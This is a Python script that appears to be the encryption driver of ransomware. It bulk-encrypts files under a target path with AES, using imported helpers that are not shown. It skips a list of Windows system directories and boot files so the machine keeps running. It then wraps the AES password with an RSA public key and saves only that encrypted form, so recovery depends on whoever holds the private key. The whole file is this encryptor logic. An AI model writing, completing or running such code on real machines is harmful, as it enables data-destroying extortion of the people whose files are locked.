import base64
import multiprocessing

from aes_class import LockPath
from aes_class import get_password, timeit
from rsa_class import RsaClass

@timeit
def encrypt_paths(): 

    paths = ["./music"]
    WHITE_DIR = ['TESTLOCKSYSTEM', 'PROGRAMDATA', 'PROGRAM FILES (X86)', 'WINDOWS', 'PROGRAM FILES', '$WINDOWS.~WS', 'INTEL', 'MOZILLA', 'APPLICATION DATA', 'PERFLOGS', 'TOR BROWSER', '$WINDOWS.~BT', 'GOOGLE', '$RECYCLE.BIN', 'APPDATA', 'MSOCACHE', 'BOOT', 'WINDOWS.OLD', 'SYSTEM VOLUME INFORMATION']
    WHITE_FILE =  ['NTLDR', 'NTUSER.DAT', 'NTUSER.DAT.LOG', 'AUTORUN.INF', 'THUMBS.DB', 'BOOTSECT.BAK', 'BOOTFONT.BIN', 'NTUSER.INI', 'DESKTOP.INI', 'BOOT.INI', 'ICONCACHE.DB']    
    encrypt_size = 16 * 1024 * 1024
    decrypt_size = encrypt_size + 32
    password = get_password()
    keylen = 32
    ivlen = 16
    
    L = LockPath(paths, WHITE_DIR, WHITE_FILE, 
    encrypt_size, decrypt_size, password, keylen, ivlen)
    L.multiprocessing_lock_path()

    public_key = RsaClass.load_pub("./rsapub.pem")  
    password = password.encode()
    password = RsaClass.encryption(public_key, password)
    password = base64.b64encode(password)
    password = password.decode()
    RsaClass.save("./password.json", password)

if __name__ == "__main__":
    multiprocessing.set_start_method("spawn")
    encrypt_paths()